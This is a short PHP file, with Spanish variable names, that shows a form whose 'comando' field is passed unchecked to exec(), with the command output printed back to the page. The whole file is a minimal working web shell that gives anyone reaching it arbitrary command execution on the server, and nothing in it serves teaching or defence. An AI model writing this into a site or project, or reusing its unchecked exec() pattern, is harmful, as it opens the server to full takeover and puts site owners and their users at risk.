<form method="post">
<input name="comando"/>
</form>
<?php
if(isset($_POST["comando"])){
$salida=array();
exec($_POST["comando"],$salida);
if($salida)
for ($i = 0; $i < count($salida); $i++) {
	print $salida[$i]."<br/>";
}}
?>